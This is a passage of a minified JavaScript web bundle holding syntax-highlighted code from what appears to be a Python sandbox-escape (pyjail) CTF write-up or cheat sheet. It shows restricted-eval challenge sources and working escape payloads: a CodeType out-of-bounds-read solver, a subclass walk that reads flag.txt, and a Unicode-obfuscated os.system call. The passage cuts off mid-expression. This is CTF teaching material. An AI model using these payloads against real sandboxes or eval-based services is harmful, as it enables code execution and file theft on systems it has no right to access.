        <span class="token punctuation">)</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">,</span> _1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token operator">+</span>_1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token operator">!=</span>g<span class="token punctuation">,</span> g<span class="token operator">==</span>g<span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># @ maple3142 - OOB read, ref (https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc)</span>
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType
<span class="token keyword">import</span> unicodedata

<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> CodeType<span class="token punctuation">(</span>
        code<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>
        <span class="token comment"># No consts for youuu</span>
        <span class="token builtin">tuple</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment"># No names for youuuu</span>
        <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_cellvars
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getnum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'(not[[]])'</span>
    <span class="token keyword">return</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'(not[])+'</span> <span class="token operator">*</span> num<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span>

names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
chr_code <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        chr_code <span class="token operator">+=</span> <span class="token number">1</span>
        char <span class="token operator">=</span> unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>chr_code<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isidentifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> char <span class="token keyword">not</span> <span class="token keyword">in</span> names<span class="token punctuation">:</span>
            names<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

table <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'__iter__'</span><span class="token punctuation">:</span> <span class="token number">710</span><span class="token punctuation">,</span>
    <span class="token string">'__reversed__'</span><span class="token punctuation">:</span> <span class="token number">713</span><span class="token punctuation">,</span>
    <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token number">716</span><span class="token punctuation">,</span>
    <span class="token string">'__dir__'</span><span class="token punctuation">:</span> <span class="token number">1144</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">def</span> <span class="token function">load_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> names<span class="token punctuation">[</span>table<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">]</span>
builtins <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'fn(fn,fn.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>load_name<span class="token punctuation">(</span><span class="token string">"__dir__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">()[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnum<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">])'</span></span>
code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''lambda fn: [</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>names<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">] if [] else [
    fn(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>builtins<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>builtins<span class="token punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>load_name<span class="token punctuation">(</span><span class="token string">"__dir__"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">()[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getnum<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">])()]
'''</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>  <span class="token comment"># copy this to the server</span>
co <span class="token operator">=</span> clear<span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">(</span>co<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token punctuation">)</span>
val <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>co<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span></code>`,Iu,ya,Xp,m_,Du,ga,Ue,Me,b_,ju,wa,Y2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">72</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token string">"__"</span> <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Nu,va,Se,Be,y_,Pu,Ea,G2=`<code class="language-py"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fbase\uFF3F_<span class="token punctuation">.</span>_\uFF3Fsubclasses\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span></code>`,Hu,ha,Qp,g_,Uu,xa,qe,ze,w_,Mu,Ca,V2=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-z0-9]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">130</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,Su,La,We,Ye,v_,Bu,Ta,$2=`<code class="language-py">__\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u029A'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u022B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0159'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\xE6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0159'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\xE6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D624}\u{1D629}\u{1D633}<span class="token punctuation">(</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u0209'</span><span class="token punctuation">)</span><span class="token operator">-</span>\u{1D630}\u{1D633}\u{1D625}<span class="token punctuation">(</span><span class="token string">'\u01A1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,qu,Aa,st,E_,zu,Oa,Ge,Ve,h_,Wu,Fa,J2=`<code class="language-py"><span class="token keyword">import</span> re
FLAG <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[123456789]'</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'('</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></code>`,Yu,Ra,$e,Je,x_,Gu,Ia,K2='<code class="language-py"><span class="token punctuation">[</span><span class="token keyword">_</span><span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token 